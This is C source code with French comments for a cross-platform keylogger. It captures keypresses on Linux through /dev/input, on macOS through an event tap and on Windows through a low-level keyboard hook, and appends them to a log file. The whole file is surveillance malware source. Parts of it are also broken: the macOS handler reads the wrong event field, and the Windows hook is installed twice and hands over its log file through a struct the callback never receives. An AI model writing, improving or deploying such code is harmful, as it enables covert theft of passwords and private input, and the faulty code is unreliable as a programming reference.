#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef __linux__

#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <dirent.h>

// Fonction pour enregistrer les événements de touches sur Linux
void keylogger(const char *file_path) {
    struct dirent *entry;
    DIR *dir = opendir("/dev/input");
    if (!dir) {
        perror("Failed to open /dev/input");
        return;
    }

    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        perror("Failed to open log file");
        closedir(dir);
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, "event") != NULL) {
            char device_path[128];
            snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
            int fd = open(device_path, O_RDONLY);
            if (fd == -1) {
                perror("Failed to open input device");
                continue;
            }

            struct input_event ev;
            while (1) {
                ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
                if (bytes == -1) {
                    perror("Failed to read input event");
                    break;
                }
                if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                    fprintf(logfile, "Key pressed: %d from %s\n", ev.code, device_path);
                }
            }
            close(fd);
        }
    }

    fclose(logfile); // Ferme le fichier à la fin
    closedir(dir);
}

#endif

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>

// Gestionnaire d'événements pour macOS
CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
    if (type == kCGEventKeyDown) {
        int keyCode = CGEventGetIntegerValueField(event, kCGEventSourceStateID);
        FILE *logfile = (FILE *)userInfo; // Récupère le fichier passé en argument
        fprintf(logfile, "Key pressed: %d\n", keyCode); // Enregistre la touche dans le fichier
    }
    return event;
}

// Fonction pour démarrer le keylogger sur macOS
void start_keylogger(const char *file_path) {
    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        printf("Failed to open log file\n");
        return;
    }

    CFMachPortRef eventTap = CGEventTapCreate(kCGEventTapEventTap, kCGEventTapOptionDefault, kCGEventTapEventTap, kCGEventKeyDown, event_handler, logfile);
    if (!eventTap) {
        printf("Failed to create event tap\n");
        fclose(logfile);
        return;
    }

    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(runLoop, CFMachPortCreateRunLoopSource(NULL, eventTap, 0), kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();

    fclose(logfile); // Ferme le fichier une fois le keylogger terminé
}

#endif

#ifdef __WIN32__

#include <windows.h>
#include <stdio.h>

// Callback pour le hook clavier sous Windows
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            FILE *logfile = (FILE *)kbd->dwExtraInfo; // Récupère le fichier passé en argument
            fprintf(logfile, "Key pressed: %d\n", kbd->vkCode); // Enregistre la touche dans le fichier
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Fonction pour démarrer le keylogger sous Windows
void start_keylogger(const char *file_path) {
    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        printf("Failed to open log file\n");
        return;
    }

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        printf("Failed to install hook\n");
        fclose(logfile);
        return;
    }

    // Passer le fichier en argument en utilisant dwExtraInfo
    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    KBDLLHOOKSTRUCT kbdInfo;
    kbdInfo.dwExtraInfo = (ULONG_PTR)logfile;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(logfile); // Ferme le fichier après l'exécution du keylogger
}

#endif
